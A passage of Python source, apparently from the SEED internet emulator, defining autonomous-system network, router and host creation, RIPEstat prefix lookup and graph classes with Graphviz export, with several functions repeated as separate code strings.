NetworkType.Local, network, aac, direct)\n\n        return self.__nets[name]\n\n    def getNetwork(self, name: str) -> Network:\n        \"\"\"!\n        @brief Retrieve a network.\n\n        @param name name of the network.\n        @returns Network.\n        \"\"\"\n        return self.__nets[name]\n\n    def getNetworks(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of name of networks.\n\n        @returns list of networks.\n        \"\"\"\n        return list(self.__nets.keys())\n\n    def createRouter(self, name: str) -> Node:\n        \"\"\"!\n        @brief Create a router node.\n\n        @param name name of the new node.\n        @returns Node.\n        \"\"\"\n        assert name not in self.__routers, 'Router with name {} already exists.'.format(name)\n        self.__routers[name] = Node(name, NodeRole.Router, self.__asn)\n\n        return self.__routers[name]\n\n    def createRealWorldRouter(self, name: str, hideHops: bool = True, prefixes: List[str] = None) -> Node:\n        \"\"\"!\n        @brief Create a real-world router node.\n\n        A real-world router nodes are connect to a special service network, \n        and can route traffic from the emulation to the real world.\n\n        @param name name of the new node.\n        @param hideHops (optional) hide real world hops from traceroute (by\n        setting TTL = 64 to all real world dists on POSTROUTING). Default to\n        True.\n        @param prefixes (optional) prefixes to announce. If unset, will try to\n        get prefixes from real-world DFZ via RIPE RIS. Default to None (get from\n        RIS)\n        @returns new node.\n        \"\"\"\n        assert name not in self.__routers, 'Router with name {} already exists.'.format(name)\n\n        router: RealWorldRouter = Node(name, NodeRole.Router, self.__asn)\n        router.__class__ = RealWorldRouter\n        router.initRealWorld(hideHops)\n\n        if prefixes == None:\n            prefixes = self.getPrefixList()\n\n        for prefix in prefixes:\n            router.addRealWorldRoute(prefix)\n\n        self.__routers[name] = router\n\n        return router\n\n    def getRouters(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of name of routers.\n\n        @returns list of routers.\n        \"\"\"\n        return list(self.__routers.keys())\n\n    def getRouter(self, name: str) -> Node:\n        \"\"\"!\n        @brief Retrieve a router node.\n\n        @param name name of the node.\n        @returns Node.\n        \"\"\"\n        return self.__routers[name]\n\n    def createHost(self, name: str) -> Node:\n        \"\"\"!\n        @brief Create a host node.\n\n        @param name name of the new node.\n        @returns Node.\n        \"\"\"\n        assert name not in self.__hosts, 'Host with name {} already exists.'.format(name)\n        self.__hosts[name] = Node(name, NodeRole.Host, self.__asn)\n\n        return self.__hosts[name]\n\n    def getHost(self, name: str) -> Node:\n        \"\"\"!\n        @brief Retrieve a host node.\n\n        @param name name of the node.\n        @returns Node.\n        \"\"\"\n        return self.__hosts[name]\n\n    def getHosts(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of name of hosts.\n\n        @returns list of hosts.\n        \"\"\"\n        return list(self.__hosts.keys())\n\n    def _doCreateGraphs(self, emulator: Emulator):\n        \"\"\"!\n        @brief create l2 connection graphs.\n        \"\"\"\n\n        l2graph = self._addGraph('AS{}: Layer 2 Connections'.format(self.__asn), False)\n        \n        for obj in self.__nets.values():\n            net: Network = obj\n            l2graph.addVertex('Network: {}'.format(net.getName()), shape = 'rectangle', group = 'AS{}'.format(self.__asn))\n\n        for obj in self.__routers.values():\n            router: Node = obj\n            rtrname = 'Router: {}'.format(router.getName(), group = 'AS{}'.format(self.__asn))\n            l2graph.addVertex(rtrname, group = 'AS{}'.format(self.__asn), shape = 'diamond')\n            for iface in router.getInterfaces():\n                net = iface.getNet()\n                netname = 'Network: {}'.format(net.getName())\n                if net.getType() == NetworkType.InternetExchange:\n                    netname = 'Exchange: {}...'.format(net.getName())\n                    l2graph.addVertex(netname, shape = 'rectangle')\n                if net.getType() == NetworkType.CrossConnect:\n                    netname = 'CrossConnect: {}...'.format(net.getName())\n                    l2graph.addVertex(netname, shape = 'rectangle')\n                l2graph.addEdge(rtrname, netname)\n\n        for obj in self.__hosts.values():\n            router: Node = obj\n            rtrname = 'Host: {}'.format(router.getName(), group = 'AS{}'.format(self.__asn))\n            l2graph.addVertex(rtrname, group = 'AS{}'.format(self.__asn))\n            for iface in router.getInterfaces():\n                net = iface.getNet()\n                netname = 'Network: {}'.format(net.getName())\n                l2graph.addEdge(rtrname, netname)\n\n        # todo: better xc graphs?\n        \n    def print(self, indent: int) -> str:\n        \"\"\"!\n        @brief print AS details (nets, hosts, routers).\n        \n        @param indent indent.\n\n        @returns printable string.\n        \"\"\"\n\n        out = ' ' * indent\n        out += 'AutonomousSystem {}:\\n'.format(self.__asn)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Networks:\\n'\n\n        for net in self.__nets.values():\n            out += net.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'Routers:\\n'\n\n        for node in self.__routers.values():\n            out += node.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'Hosts:\\n'\n\n        for host in self.__hosts.values():\n            out += host.print(indent + 4)\n\n        return out",
  "def __init__(self, asn: int, subnetTemplate: str = \"10.{}.0.0/16\"):\n        \"\"\"!\n        @brief AutonomousSystem constructor.\n\n        @param asn ASN for this system.\n        @param subnetTemplate (optional) template for assigning subnet.\n        \"\"\"\n        super().__init__()\n        self.__hosts = {}\n        self.__routers = {}\n        self.__nets = {}\n        self.__asn = asn\n        self.__subnets = None if asn > 255 else list(IPv4Network(subnetTemplate.format(asn)).subnets(new_prefix = 24))\n        self.__name_servers = []",
  "def setNameServers(self, servers: List[str]) -> AutonomousSystem:\n        \"\"\"!\n        @brief set recursive name servers to use on nodes in this AS. Overwrites\n        emulator-level settings.\n\n        @param servers list of IP addresses of recursive name servers. Set to\n        empty list to use default (i.e., do not change, or use emulator-level\n        settings)\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__name_servers = servers\n\n        return self",
  "def getNameServers(self) -> List[str]:\n        \"\"\"!\n        @brief get configured recursive name servers for nodes in this AS.\n\n        @returns list of IP addresses of recursive name servers\n        \"\"\"\n        return self.__name_servers",
  "def getPrefixList(self) -> List[str]:\n        \"\"\"!\n        @brief Helper tool, get real-world prefix list for the current ans by\n        RIPE RIS.\n\n        @throw AssertionError if API failed.\n        \"\"\"\n\n        rslt = requests.get(RIS_PREFIXLIST_URL, {\n            'resource': self.__asn\n        })\n\n        assert rslt.status_code == 200, 'RIPEstat API returned non-200'\n        \n        json = rslt.json()\n        assert json['status'] == 'ok', 'RIPEstat API returned not-OK'\n \n        return [p['prefix'] for p in json['data']['prefixes'] if ':' not in p['prefix']]",
  "def registerNodes(self, emulator: Emulator):\n        \"\"\"!\n        @brief register all nodes in the as in the emulation.\n\n        Note: this is to be invoked by the renderer.\n\n        @param emulator emulator to register nodes in.\n        \"\"\"\n\n        reg = emulator.getRegistry()\n            \n        for val in list(self.__nets.values()):\n            net: Network = val\n            if net.getRemoteAccessProvider() != None:\n                rap = net.getRemoteAccessProvider()\n\n                brNode = self.createRouter('br-{}'.format(net.getName()))\n                brNet = emulator.getServiceNetwork()\n\n                rap.configureRemoteAccess(emulator, net, brNode, brNet)\n\n        for router in list(self.__routers.values()):\n            if issubclass(router.__class__, RealWorldRouter):\n                router.joinNetwork(emulator.getServiceNetwork().getName())\n\n        for (key, val) in self.__nets.items(): reg.register(str(self.__asn), 'net', key, val)\n        for (key, val) in self.__hosts.items(): reg.register(str(self.__asn), 'hnode', key, val)\n        for (key, val) in self.__routers.items(): reg.register(str(self.__asn), 'rnode', key, val)",
  "def configure(self, emulator: Emulator):\n        \"\"\"!\n        @brief configure all nodes in the as in the emulation.\n\n        Note: this is to be invoked by the renderer.\n\n        @param emulator emulator to configure nodes in.\n        \"\"\"\n        for host in self.__hosts.values():\n            if len(host.getNameServers()) == 0:\n                host.setNameServers(self.__name_servers)\n            \n            host.configure(emulator)\n        \n        for router in self.__routers.values():\n            if len(router.getNameServers()) == 0:\n                router.setNameServers(self.__name_servers)\n\n            router.configure(emulator)",
  "def getAsn(self) -> int:\n        \"\"\"!\n        @brief Get ASN.\n\n        @returns asn.\n        \"\"\"\n        return self.__asn",
  "def createNetwork(self, name: str, prefix: str = \"auto\", direct: bool = True, aac: AddressAssignmentConstraint = None) -> Network:\n        \"\"\"!\n        @brief Create a new network.\n\n        @param name name of the new network.\n        @param prefix optional. Network prefix of this network. If not set, a\n        /24 subnet of \"10.{asn}.{id}.0/24\" will be used, where asn is ASN of\n        this AS, and id is a self-incremental value starts from 0.\n        @param direct optional. direct flag of the network. A direct network\n        will be added to RIB of routing daemons. Default to true.\n        @param aac optional. AddressAssignmentConstraint to use. Default to\n        None.\n\n        @returns Network.\n        @throws StopIteration if subnet exhausted.\n        \"\"\"\n        assert prefix != \"auto\" or self.__asn <= 255, \"can't use auto: asn > 255\"\n\n        network = IPv4Network(prefix) if prefix != \"auto\" else self.__subnets.pop(0)\n        assert name not in self.__nets, 'Network with name {} already exist.'.format(name)\n        self.__nets[name] = Network(name, NetworkType.Local, network, aac, direct)\n\n        return self.__nets[name]",
  "def getNetwork(self, name: str) -> Network:\n        \"\"\"!\n        @brief Retrieve a network.\n\n        @param name name of the network.\n        @returns Network.\n        \"\"\"\n        return self.__nets[name]",
  "def getNetworks(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of name of networks.\n\n        @returns list of networks.\n        \"\"\"\n        return list(self.__nets.keys())",
  "def createRouter(self, name: str) -> Node:\n        \"\"\"!\n        @brief Create a router node.\n\n        @param name name of the new node.\n        @returns Node.\n        \"\"\"\n        assert name not in self.__routers, 'Router with name {} already exists.'.format(name)\n        self.__routers[name] = Node(name, NodeRole.Router, self.__asn)\n\n        return self.__routers[name]",
  "def createRealWorldRouter(self, name: str, hideHops: bool = True, prefixes: List[str] = None) -> Node:\n        \"\"\"!\n        @brief Create a real-world router node.\n\n        A real-world router nodes are connect to a special service network, \n        and can route traffic from the emulation to the real world.\n\n        @param name name of the new node.\n        @param hideHops (optional) hide real world hops from traceroute (by\n        setting TTL = 64 to all real world dists on POSTROUTING). Default to\n        True.\n        @param prefixes (optional) prefixes to announce. If unset, will try to\n        get prefixes from real-world DFZ via RIPE RIS. Default to None (get from\n        RIS)\n        @returns new node.\n        \"\"\"\n        assert name not in self.__routers, 'Router with name {} already exists.'.format(name)\n\n        router: RealWorldRouter = Node(name, NodeRole.Router, self.__asn)\n        router.__class__ = RealWorldRouter\n        router.initRealWorld(hideHops)\n\n        if prefixes == None:\n            prefixes = self.getPrefixList()\n\n        for prefix in prefixes:\n            router.addRealWorldRoute(prefix)\n\n        self.__routers[name] = router\n\n        return router",
  "def getRouters(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of name of routers.\n\n        @returns list of routers.\n        \"\"\"\n        return list(self.__routers.keys())",
  "def getRouter(self, name: str) -> Node:\n        \"\"\"!\n        @brief Retrieve a router node.\n\n        @param name name of the node.\n        @returns Node.\n        \"\"\"\n        return self.__routers[name]",
  "def createHost(self, name: str) -> Node:\n        \"\"\"!\n        @brief Create a host node.\n\n        @param name name of the new node.\n        @returns Node.\n        \"\"\"\n        assert name not in self.__hosts, 'Host with name {} already exists.'.format(name)\n        self.__hosts[name] = Node(name, NodeRole.Host, self.__asn)\n\n        return self.__hosts[name]",
  "def getHost(self, name: str) -> Node:\n        \"\"\"!\n        @brief Retrieve a host node.\n\n        @param name name of the node.\n        @returns Node.\n        \"\"\"\n        return self.__hosts[name]",
  "def getHosts(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of name of hosts.\n\n        @returns list of hosts.\n        \"\"\"\n        return list(self.__hosts.keys())",
  "def _doCreateGraphs(self, emulator: Emulator):\n        \"\"\"!\n        @brief create l2 connection graphs.\n        \"\"\"\n\n        l2graph = self._addGraph('AS{}: Layer 2 Connections'.format(self.__asn), False)\n        \n        for obj in self.__nets.values():\n            net: Network = obj\n            l2graph.addVertex('Network: {}'.format(net.getName()), shape = 'rectangle', group = 'AS{}'.format(self.__asn))\n\n        for obj in self.__routers.values():\n            router: Node = obj\n            rtrname = 'Router: {}'.format(router.getName(), group = 'AS{}'.format(self.__asn))\n            l2graph.addVertex(rtrname, group = 'AS{}'.format(self.__asn), shape = 'diamond')\n            for iface in router.getInterfaces():\n                net = iface.getNet()\n                netname = 'Network: {}'.format(net.getName())\n                if net.getType() == NetworkType.InternetExchange:\n                    netname = 'Exchange: {}...'.format(net.getName())\n                    l2graph.addVertex(netname, shape = 'rectangle')\n                if net.getType() == NetworkType.CrossConnect:\n                    netname = 'CrossConnect: {}...'.format(net.getName())\n                    l2graph.addVertex(netname, shape = 'rectangle')\n                l2graph.addEdge(rtrname, netname)\n\n        for obj in self.__hosts.values():\n            router: Node = obj\n            rtrname = 'Host: {}'.format(router.getName(), group = 'AS{}'.format(self.__asn))\n            l2graph.addVertex(rtrname, group = 'AS{}'.format(self.__asn))\n            for iface in router.getInterfaces():\n                net = iface.getNet()\n                netname = 'Network: {}'.format(net.getName())\n                l2graph.addEdge(rtrname, netname)",
  "def print(self, indent: int) -> str:\n        \"\"\"!\n        @brief print AS details (nets, hosts, routers).\n        \n        @param indent indent.\n\n        @returns printable string.\n        \"\"\"\n\n        out = ' ' * indent\n        out += 'AutonomousSystem {}:\\n'.format(self.__asn)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Networks:\\n'\n\n        for net in self.__nets.values():\n            out += net.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'Routers:\\n'\n\n        for node in self.__routers.values():\n            out += node.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'Hosts:\\n'\n\n        for host in self.__hosts.values():\n            out += host.print(indent + 4)\n\n        return out",
  "class Vertex:\n    \"\"\"!\n    @brief a vertex in graph.\n    \"\"\"\n\n    name: str\n    group: str\n    shape: str\n\n    def __init__(self, name: str, group: str = None, shape: str = 'ellipse'):\n        \"\"\"!\n        @brief Vertex constructor.\n\n        @param name name.\n        @param group cluster name.\n        @param shape shape.\n        \"\"\"\n\n        ## name of the node.\n        self.name = name\n\n        ## group of the node, nodes within same group will be put into the same\n        ## cluster.\n        self.group = group\n\n        ## shape of the node\n        self.shape = shape\n\n    def getId(self):\n        \"\"\"!\n        @brief Get the unique id of this node. \n        \"\"\"\n        return str(self.group) + \"::\" + str(self.name)",
  "class Edge:\n    \"\"\"!\n    @brief an edge in graph.\n    \"\"\"\n\n    a: str\n    b: str\n    label: str\n    alabel: str\n    blabel: str    \n    style: str \n\n    def __init__(self, a: str, b: str, label: str = None, alabel: str = None, blabel: str = None, style: str = 'solid'):\n        \"\"\"!\n        @brief Edge constructor.\n\n        @param a source node.\n        @param b destination node.\n        @param label middle label.\n        @param alabel label on the source side.\n        @param blabel label on the destination side.\n        @param style style.\n        \"\"\"\n\n        ## name of vertex, if directed, this is src\n        self.a = a\n\n        ## name of vertex, if directed, this is dest\n        self.b = b\n\n        ## label on the middle of the edge\n        self.label = label\n\n        ## label on the a side of the edge\n        self.alabel = alabel\n\n        ## label on the b side of the edge\n        self.blabel = blabel\n\n        ## style of the edge\n        self.style = style",
  "class Graph(Printable):\n    \"\"\"!\n    @brief a graph.\n    \"\"\"\n\n    name: str\n    directed: bool\n    vertices: Dict[str, Vertex]\n    edges: List[Edge]\n\n    def __init__(self, name: str, directed: bool):\n        \"\"\"!\n        @brief Graph constructor.\n\n        @param name name.\n        @param directed directed graph?\n        \"\"\"\n\n        ## name of the graph.\n        self.name = name\n\n        ## directed graph?\n        self.directed = directed\n\n        ## list of vertices\n        self.vertices = {}\n\n        ## list of edges\n        self.edges = []\n\n    def copy(self, graph: Graph):\n        \"\"\"!\n        @brief Copy all edges, vertices from another graph.\n\n        @param graph graph to copy from\n        \"\"\"\n\n        self.edges += deepcopy(graph.edges)\n        self.vertices.update(deepcopy(graph.vertices))\n\n    def addVertex(self, name: str, group: str = None, shape: str = 'ellipse'):\n        \"\"\"!\n        @brief add a new node.\n        \n        @param name name of the node.\n        @param group (optional) name of the cluster.\n        @param shape (optional) shape of the vertex.\n\n        @throws AssertionError if vertex already exist.\n        \"\"\"\n        assert not self.hasVertex(name, group), '{}: vertex with name {} already exist.'.format(self.name, name)\n        v = Vertex(name, group, shape)\n        self.vertices[v.getId()] = v\n\n    def hasVertex(self, name: str, group: str = None):\n        \"\"\"!\n        @brief Test if a vertex exists.\n\n        @todo \n\n        @returns True if exist.\n        \"\"\"\n        return Vertex(name, group).getId() in self.vertices\n\n    def __findVertex(self, name: str, group: str = None):\n        if self.hasVertex(name, group):\n            return self.vertices[Vertex(name, group).getId()]\n        assert group == None, '{}: {}::{} is not a vertex.'.format(self.name, group, name)\n        for v in self.vertices.values():\n            if v.name == name: return v\n        assert False, '{}: {}::{} is not a vertex.'.format(self.name, group, name)\n\n    def addEdge(self, a: str, b: str, agroup: str = None, bgroup: str = None, label: str = None, alabel: str = None, blabel: str = None, style: str = 'solid'):\n        \"\"\"!\n        @brief add a new edge\n        @throws AssertionError if vertex a or b does not exist.\n        \"\"\"\n        self.edges.append(Edge(self.__findVertex(a, agroup).getId(), self.__findVertex(b, bgroup).getId(), label, alabel, blabel, style))\n\n    def hasEdge(self, a: str, b: str):\n        \"\"\"!\n        @brief Test if an edge exists.\n\n        @returns True if exist.\n        \"\"\"\n        pass\n\n    def toGraphviz(self) -> str:\n        \"\"\"!\n        @brief Convert graph to graphviz dot format.\n\n        @todo todo\n\n        @returns graphviz source.\n        \"\"\"\n        out = '{} \"{}\" {{\\n'.format('digraph' if self.directed else 'graph', self.name)\n        vlines = []\n        cluster_vlines = {}\n        indent = 4\n\n        out += ' ' * indent\n        out += 'label = \"{}\"\\n'.format(self.name)\n\n        for v in self.vertices.values():\n            options = ' '\n            if v.name != None: options += 'label=\"{}\" '.format(v.name)\n            if v.shape != None: options += 'shape=\"{}\" '.format(v.shape)\n            vline = '\"{}\" [{}]\\n'.format(v.getId(), options)\n            \n            if v.group != None:\n                if v.group not in cluster_vlines: cluster_vlines[v.group] = []\n                cluster_vlines[v.group].append(vline)\n            else: vlines.append(vline)\n\n        for line in vlines:\n            out += ' ' * indent\n            out += line\n        \n        cluster_id = 0\n        for (l, c) in cluster_vlines.items():\n            out += ' ' * indent\n            out += 'subgraph cluster_{} {{\\n'.format(cluster_id)\n            indent += 4\n\n            out += ' ' * indent\n            out += 'label = \"{}\"\\n'.format(l)\n\n            for line in c:\n                out += ' ' * indent\n                out += line\n\n            indent -= 4\n            out += ' ' * indent\n            out += '}\\n'\n\n            cluster_id += 1\n\n\n        for e in self.edges:\n            out += ' ' * indent\n            options = ' '\n            if e.label != None: options += 'label=\"{}\" '.format(e.label)\n            if e.alabel != None: options += 'taillabel=\"{}\" '.format(e.alabel)\n            if e.blabel != None: options += 'headlabel=\"{}\" '.format(e.blabel)\n            if e.style != None: options += 'style=\"{}\" '.format(e.style)\n            out += '\"{}\" {} \"{}\" [{}]\\n'.format(e.a, '->' if self.directed else '--', e.b, options)\n\n        out += '}'\n\n        return out\n\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Graph \"{}\":\\n'.format(self.name)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Vertices:\\n'\n\n        indent += 4\n        for v in self.vertices.values():\n            out += ' ' * indent\n            out += '\"{}\", group \"{}\"\\n'.format(v.name, v.group)\n\n        indent -= 4\n        out += ' ' * indent\n        out += 'Edges:\\n'\n\n        indent += 4\n        for e in self.edges:\n            out += ' ' * indent\n            out += '\"{}\" {} \"{}\"\\n'.format(e.a, '->' if self.directed else '--', e.b)\n\n        return out",
  "class Graphable(Registrable):\n    \"\"\"!\n    @brief Graphable. All layers that can produce graphs will have this\n    prototype.\n    \"\"\"\n\n    __graphs: Dict[str, Graph]\n    __graphs_created: bool\n    _n_graphs = 0\n\n    def __init__(self):\n        \"\"\"!\n        @brief Graphable constructor.\n        \"\"\"\n        self.__graphs = {}\n        self.__graphs_created = False\n\n    def _addGraph(self, name: str, directed: bool) -> Graph:\n        \"\"\"!\n        @brief create a new graph. This is to be called by internal classes to\n        create graph. If a graph already exists, it will be returned.\n\n        @return newly created graph.\n        @throws AssertionError if graph already exist.\n        \"\"\"\n        if name in self.__graphs: return self.__graphs[name]\n        g = Graph(name, directed)\n        self.__graphs[name] = g\n        return g\n    \n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get name of this graph provider.\n        \"\"\"\n        raise NotImplementedError('getName not implemented.')\n\n    def getGraph(self, name: str) -> Graph:\n        \"\"\"!\n        @brief get a graph by name.\n\n        @param name name.\n\n        @returns graph.\n        @throws AssertionError if graph does not exist.\n        \"\"\"\n        assert name in self.__graphs, 'graph {} does not exist'.format(name)\n        return self.__graphs[name]\n\n    def getGraphs(self) -> Dict[str, Graph]:\n        \"\"\"!\n        @brief Get all available graphs.\n\n        @returns all graphs.\n        \"\"\"\n        return self.__graphs\n\n    def _doCreateGraphs(self, emulator: Emulator):\n        \"\"\"!\n        @brief handle graph creation, should be implemented by all graphable\n        classes.\n\n        @param emulator emulator object.\n        \"\"\"\n        raise NotImplementedError('_doCreateGraphs not implemented.')\n\n    def createGraphs(self, emulator: Emulator):\n        \"\"\"!\n        @brief Create graphs.\n\n        @param emulator emulator object.\n\n        Call this method to ask the class to create graphs.\n        \"\"\"\n        assert emulator.rendered(), 'Simulation needs to be rendered before graphs can be created.'\n        reg = emulator.getRegistry()\n        reg.register('seedemu', 'graph', str(len(reg.getByType('seedemu', 'graph'))), self)\n        if self.__graphs_created: return\n        self._doCreateGraphs(emulator)\n        self.__graphs_created = True",
  "def __init__(self, name: str, group: str = None, shape: str = 'ellipse'):\n        \"\"\"!\n        @brief Vertex constructor.\n\n        @param name name.\n        @param group cluster name.\n        @param shape shape.\n        \"\"\"\n\n        ## name of the node.\n        self.name = name\n\n        ## group of the node, nodes within same group will be put into the same\n        ## cluster.\n        self.group = group\n\n        ## shape of the node\n        self.shape = shape",
  "def getId(self):\n        \"\"\"!\n        @brief Get the unique id of this node. \n        \"\"\"\n        return str(self.group) + \"::\" + str(self.name)",
  "def __init__(self, a: str, b: str, label: str = None, alabel: str = None, blabel: str = None, style: str = 'solid'):\n        \"\"\"!\n        @brief Edge constructor.\n\n        @param a source node.\n        @param b destination node.\n        @param label middle label.\n        @param alabel label on the source side.\n        @param blabel label on the destination side.\n        @param style style.\n        \"\"\"\n\n        ## name of vertex, if directed, this is src\n        self.a = a\n\n        ## name of vertex, if directed, this is dest\n        self.b = b\n\n        ## label on the middle of the edge\n        self.label = label\n\n        ## label on the a side of the edge\n        self.alabel = alabel\n\n        ## label on the b side of the edge\n        self.blabel = blabel\n\n        ## style of the edge\n        self.style = style",
  "def __init__(self, name: str, directed: bool):\n        \"\"\"!\n        @brief Graph constructor.\n\n        @param name name.\n        @param directed directed graph?\n        \"\"\"\n\n        ## name of the graph.\n        self.name = name\n\n        ## directed graph?\n        self.directed = directed\n\n        ## list of vertices\n        self.vertices = {}\n\n        ## list of edges\n        self.edges = []",
  "def copy(self, graph: Graph):\n        \"\"\"!\n        @brief Copy all edges, vertices from another graph.\n\n        @param graph graph to copy from\n        \"\"\"\n\n        self.edges += deepcopy(graph.edges)\n        self.vertices.update(deepcopy(graph.vertices))",
  "def addVertex(self, name: str, group: str = None, shape: str = 'ellipse'):\n        \"\"\"!\n        @brief add a new node.\n        \n        @param name name of the node.\n        @param group (optional) name of the cluster.\n        @param shape (optional) shape of the vertex.\n\n        @throws AssertionError if vertex already exist.\n        \"\"\"\n        assert not self.hasVertex(name, group), '{}: vertex with name {} already exist.'.format(self.name, name)\n        v = Vertex(name, group, shape)\n        self.vertices[v.getId()] = v",
  "def hasVertex(self, name: str, group: str = None):\n        \"\"\"!\n        @brief Test if a vertex exists.\n\n        @todo \n\n        @returns True if exist.\n        \"\"\"\n        return Vertex(name, group).getId() in self.vertices",
  "def __findVertex(self, name: str, group: str = None):\n        if self.hasVertex(name, group):\n            return self.vertices[Vertex(name, group).getId()]\n        assert group == None, '{}: {}::{} is not a vertex.'.format(self.name, group, name)\n        for v in self.vertices.values():\n            if v.name == name: return v\n        assert False, '{}: {}::{} is not a vertex.'.format(self.name, group, name)",
  "def addEdge(self, a: str, b: str, agroup: str = None, bgroup: str = None, label: str = None, alabel: str = None, blabel: str = None, style: str = 'solid'):\n        \"\"\"!\n        @brief add a new edge\n        @throws AssertionError if vertex a or b does not exist.\n        \"\"\"\n        self.edges.append(Edge(self.__findVertex(a, agroup).getId(), self.__findVertex(b, bgroup).getId(), label, alabel, blabel, style))",
  "def hasEdge(self, a: str, b: str):\n        \"\"\"!\n        @brief Test if an edge exists.\n\n        @returns True if exist.\n        \"\"\"\n        pass",
  "def toGraphviz(self) -> str:\n        \"\"\"!\n        @brief Convert graph to graphviz dot format.\n\n        @todo todo\n\n        @returns graphviz source.\n        \"\"\"\n        out = '{} \"{}\" {{\\n'.format('digraph' if self.directed else 'graph', self.name)\n        vlines = []\n        cluster_vlines = {}\n        indent = 4\n\n        out += ' ' * indent\n        out += 'label = \"{}\"\\n'.format(self.name)\n\n        for v in self.vertices.values():\n            options = ' '\n            if v.name != None: options += 'label=\"{}\" '.format(v.name)\n            if v.shape != None: options += 'shape=\"{}\" '.format(v.shape)\n            vline = '\"{}\" [{}]\\n'.format(v.getId(), options)\n            \n            if v.group != None:\n                if v.group not in cluster_vlines: cluster_vlines[v.group] = []\n                cluster_vlines[v.group].append(vline)\n            else: vlines.append(vline)\n\n        for line in vlines:\n            out += ' ' * indent\n            out += line\n        \n        cluster_id = 0\n        for (l, c) in cluster_vlines.items():\n            out += ' ' * indent\n            out += 'subgraph cluster_{} {{\\n'.format(cluster_id)\n            indent += 4\n\n            out += ' ' * indent\n            out += 'label = \"{}\"\\n'.format(l)\n\n            for line in c:\n                out += ' ' * indent\n                out += line\n\n            indent -= 4\n            out += ' ' * indent\n            out += '}\\n'\n\n            cluster_id += 1\n\n\n        for e in self.edges:\n            out += ' ' * indent\n            options = ' '\n            if e.label != None: options += 'label=\"{}\" '.format(e.label)\n            if e.alabel != None: options += 'taillabel=\"{}\" '.format(e.alabel)\n            if e.blabel != None: options += 'headlabel=\"{}\" '.format(e.blabel)\n            if e.style != None: options += 'style=\"{}\" '.format(e.style)\n            out += '\"{}\" {} \"{}\" [{}]\\n'.format(e.a, '->' if self.directed else '--', e.b, options)\n\n        out += '}'\n\n        return out",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Graph \"{}\":\\n'.format(self.name)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Vertices:\\n'\n\n        indent += 4\n        for v in self.vertices.values():\n            out += ' ' * indent\n            out += '\"{}\", group \"{}\"\\n'.format(v.name, v.group)\n\n        indent -= 4\n        out += ' ' * indent\n        out += 'Edges:\\n'\n\n        indent += 4\n        for e in self.edges:\n            out += ' ' * indent\n            out += '\"{}\" {} \"{}\"\\n'.format(e.a, '->' if self.directed else '--', e.b)\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief Graphable constructor.\n        \"\"\"\n        self.__graphs = {}\n        self.__graphs_created = False",
  "def _addGraph(self, name: str, directed: bool) -> Graph:\n        \"\"\"!\n        @brief create a new graph. This is to be called by internal classes to\n        create graph. If a graph already exists, it will be returned.\n\n        @return newly created graph.\n        @throws AssertionError if graph already exist.\n        \"\"\"\n        if name in self.__graphs: return self.__graphs[name]\n        g = Graph(name, directed)\n        self.__graphs[name] = g\n        return g",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get name of this graph provider.\n        \"\"\"\n        raise NotImplementedError('getName not implemented.')",
  "def getGraph(self, name: str) -> Graph:\n        \"\"\"!\n        @brief get a graph by name.\n\n        @param name name.\n\n        @returns graph.\n        @throws AssertionError if graph does not exist.\n        \"\"\"\n        assert name in self.__graphs, 'graph {} does not exist'.format(name)\n        return self.__graphs[name]",
  "def getGraphs(self) -> Dict[str, Graph]:\n        \"\"\"!\n        @brief Get all available graphs.\n\n        @returns all graphs.\n        \"\"\"\n        return self.__graphs",
  "def _doCreateGraphs(self, emulator: Emulator):\n        \"\"\"!\n        @brief handle graph creation, should be implemented by all graphable\n        classes.\n\n        @param emulator emulator object.\n        \"\"\"\n        raise NotImplementedError('_doCreateGraphs not implemented.')",
  "def createGraphs(self, emulator: Emulator):\n        \"\"\"!\n        @brief Create graphs.\n\n        @param emulator emulator object.\n\n        Call this method to ask the class to create graphs.\n        \"\"\"\n        assert emulator.rendered(), 'Simulation needs to be rendered before graphs can be created.'\n        reg = emulator.getRegistry()\n        reg.register('seedemu', 'graph', str(len(reg.getByType('seedemu', 'graph'))), self)\n        if self.__graphs_created: return\n        self._doCreateGraphs(emulator)\n        self.__graphs_created = True",
  "class Base(Layer, Graphable):\n    \"\"\"!\n    @brief The base layer.\n    \"\"\"\n\n    __ases: Dict[int, AutonomousSystem]\n    __ixes: Dict[int, InternetExchange]\n\n    __name_servers: List[str]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Base layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__ases = {}\n        self.__ixes = {}\n        self.__name_servers = []\n\n    def getName(self) -> str:\n        return \"Base\"\n\n    def configure(self, emulator: Emulator):\n        self._log('registering nodes...')\n        for asobj in self.__ases.values():\n            if len(asobj.getNameServers()) == 0:\n                asobj.setNameServers(self.__name_servers)\n\n            asobj.registerNodes(emulator)\n\n        self._log('setting up internet exchanges...')\n        for ix in self.__ixes.values(): ix.configure(emulator)\n\n        self._log('setting up autonomous systems...')\n        for asobj in self.__ases.values(): asobj.configure(emulator)\n\n    def render(self, emulator: Emulator) -> None:\n        for ((scope, type, name), obj) in emulator.getRegistry().getAll().items():\n\n            if type not in ['rs', 'rnode', 'hnode', 'csnode']:\n                continue\n\n            node: Node = obj\n\n            ifinfo = ''\n            for iface in node.getInterfaces():\n                net = iface.getNet()\n                [l, b, d] = iface.getLinkProperties()\n                ifinfo += '{}:{}:{}:{}:{}\\n'.format(net.getName(), net.getPrefix(), l, b, d)\n\n            node.setFile('/ifinfo.txt', ifinfo)\n            node.setFile('/interface_setup', BaseFileTemplates['interface_setup_script'])\n            